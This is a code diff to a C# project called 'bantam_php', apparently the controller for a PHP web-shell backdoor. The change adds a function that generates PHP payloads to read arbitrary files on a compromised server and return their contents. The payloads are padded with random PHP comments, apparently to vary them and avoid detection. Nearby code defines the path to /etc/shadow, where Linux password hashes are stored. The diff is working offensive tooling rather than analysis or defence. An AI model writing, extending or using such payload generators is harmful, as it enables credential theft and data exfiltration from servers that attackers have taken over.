@@ -36,6 +36,11 @@ namespace bantam_php
         public const string g_delimiter = ",.$.,";
 
         /// <summary>
+        /// PHP
+        /// </summary>
+        public const string phpServerScriptFileName = "$_SERVER['SCRIPT_FILENAME']";
+
+        /// <summary>
         /// Linux File Locations
         /// </summary>
         public static string linuxFS_ShadowFile         = "/etc/shadow";
@@ -339,7 +344,26 @@ namespace bantam_php
         /// <param name="fileName"></param>
         /// <param name="encryptResponse"></param>
         /// <returns></returns>
-        public static string ReadFileProcedure(string fileName, bool encryptResponse)
+        public static string ReadFileFromVar(string fileName, bool encryptResponse)
+        {
+            if (encryptResponse) {
+                return RandomPHPComment()
+                     + @"$result = @is_readable(" + fileName + ") ? file_get_contents(" + fileName + ") : 'File Not Readable';"
+                     + RandomPHPComment();
+            } else {
+                return RandomPHPComment()
+                     + "echo @is_readable(" + fileName + ") ? file_get_contents(" + fileName + ") : 'File Not Readable';"
+                     + RandomPHPComment();
+            }
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="fileName"></param>
+        /// <param name="encryptResponse"></param>
+        /// <returns></returns>
+        public static string ReadFile(string fileName, bool encryptResponse)
         {
             if (encryptResponse) {
                 return RandomPHPComment() 
